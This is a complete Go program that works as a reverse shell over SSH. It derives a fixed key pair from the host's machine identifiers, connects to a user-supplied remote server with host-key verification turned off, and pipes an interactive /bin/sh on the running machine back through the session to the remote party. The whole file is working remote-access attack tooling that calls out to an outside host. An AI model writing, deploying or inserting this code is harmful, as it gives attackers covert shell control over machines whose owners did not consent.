package main

import (
	"crypto/ed25519"
	"crypto/sha256"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	"golang.org/x/crypto/ssh"
)

// seedFromSystem derives a deterministic 32-byte seed from stable machine
// identifiers so the same host always produces the same key pair.
func seedFromSystem() ([]byte, error) {
	candidates := []string{
		"/etc/machine-id",
		"/proc/sys/kernel/random/boot_id",
		"/sys/class/dmi/id/product_uuid",
	}
	for _, path := range candidates {
		data, err := os.ReadFile(path)
		if err == nil && len(strings.TrimSpace(string(data))) > 0 {
			h := sha256.Sum256(data)
			return h[:], nil
		}
	}
	return nil, fmt.Errorf("no stable machine identifier found (tried %v)", candidates)
}

// generateKey returns a deterministic Ed25519 key pair derived from the system seed.
func generateKey() (ssh.Signer, ssh.PublicKey, error) {
	seed, err := seedFromSystem()
	if err != nil {
		return nil, nil, err
	}

	privKey := ed25519.NewKeyFromSeed(seed)
	signer, err := ssh.NewSignerFromKey(privKey)
	if err != nil {
		return nil, nil, err
	}
	return signer, signer.PublicKey(), nil
}

func formatPublicKey(pub ssh.PublicKey) string {
	return strings.TrimSpace(string(ssh.MarshalAuthorizedKey(pub)))
}

// DialWithKey connects to the SSH server using the provided signer.
func DialWithKey(addr, user string, signer ssh.Signer) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return ssh.Dial("tcp", addr, config)
}

// Start pipes a local shell bidirectionally through the SSH session.
func Start(client *ssh.Client) error {
	session, err := client.NewSession()
	if err != nil {
		return fmt.Errorf("new session: %w", err)
	}
	defer session.Close()

	cmd := exec.Command("/bin/sh", "-c", "/bin/sh -i 2>&1")

	shellStdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("stdin pipe: %w", err)
	}

	shellStdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("stdout pipe: %w", err)
	}

	session.Stdin = shellStdout
	session.Stdout = shellStdin

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start shell: %w", err)
	}
	defer cmd.Process.Kill()

	if err := session.Shell(); err != nil {
		return fmt.Errorf("ssh shell: %w", err)
	}

	done := make(chan error, 2)
	go func() { done <- session.Wait() }()
	go func() { done <- cmd.Wait() }()
	return <-done
}

func main() {
	showKey := flag.Bool("print-key", false, "Print the public key and exit")
	flag.Parse()

	signer, pub, err := generateKey()
	if err != nil {
		log.Fatalf("Key generation error: %s", err)
	}

	if *showKey {
		fmt.Fprintln(os.Stderr, formatPublicKey(pub))
		return
	}

	if len(flag.Args()) < 1 {
		fmt.Fprintf(os.Stderr, "Usage: %s [-print-key] [user@]host[:port]\n", os.Args[0])
		os.Exit(1)
	}

	parts := strings.SplitN(flag.Args()[0], "@", 2)
	user := "rshell"
	host := parts[0]
	if len(parts) > 1 {
		user = parts[0]
		host = parts[1]
	}
	if !strings.Contains(host, ":") {
		host += ":22"
	}

	fmt.Fprintln(os.Stderr, formatPublicKey(pub))

	client, err := DialWithKey(host, user, signer)
	if err != nil {
		log.Fatalf("Connection error: %s", err)
	}
	defer client.Close()

	if err := Start(client); err != nil {
		log.Fatalf("Shell error: %s", err)
	}
}
